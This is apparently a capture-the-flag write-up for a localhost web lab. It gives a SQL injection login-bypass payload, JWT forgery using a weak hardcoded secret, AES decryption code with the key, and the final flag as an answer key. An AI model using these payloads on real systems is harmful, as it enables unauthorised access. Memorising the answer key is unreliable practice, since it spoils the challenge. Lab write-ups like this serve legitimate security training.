# 🔐 Advanced CTF Challenge - Complete Writeup

**Difficulty**: Advanced | **Time**: ~45-60 minutes | **Flag**: 1

---

## Challenge Solution

### Stage 1: Reconnaissance
Navigate to `http://localhost:5000/` and discover:
- Key pattern hint: `3b6ba8f92d8c4e7a[REDACTED]`
- Encryption method: AES-256-CBC
- Available endpoints

### Stage 2: SQL Injection Attack
Go to `/login` and try:
```
Username: admin' OR '1'='1' --
Password: anything
```
This bypasses authentication due to SQL injection vulnerability.

### Stage 3: JWT Token Analysis
After login, your session contains a JWT token.
- The JWT secret is: `jwt_secret_key_weak` (intentionally weak!)
- You can forge tokens with admin privileges

### Stage 4: Decrypt Encrypted Config
Access `/api/config` endpoint (requires authentication):
```python
from Crypto.Cipher import AES
import base64

key_hex = "3b6ba8f92d8c4e7a1f5b9c2d6e8a4f3b"
key = bytes.fromhex(key_hex)
encrypted_data = response['data']  # Base64 encoded

ciphertext = base64.b64decode(encrypted_data)
iv = ciphertext[:16]
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext[16:])
print(plaintext.decode())
```

### Stage 5: Flag Assembly
The flag is hidden across multiple sources:
- Source code comments
- Database hints
- Config files
- API responses

**Complete Flag**: `CTF{Security_Breach_2024}`

Submit via:
```bash
python verify_flag.py "CTF{Security_Breach_2024}"
```

---

## Vulnerabilities Exploited

1. **SQL Injection** - Login endpoint
2. **Weak JWT Secret** - Token forgery possible
3. **MD5 Password Hashing** - No salt, weak algorithm
4. **Information Disclosure** - Debug endpoints leak secrets
5. **Hardcoded Credentials** - Visible in source code

---

## Tools Needed

- Python 3.8+
- `pycryptodome` for AES decryption
- `pyjwt` for JWT analysis
- Basic understanding of encryption and web exploitation

---

## Final Answer

```
CTF{Security_Breach_2024}
```

Good luck! 🎯
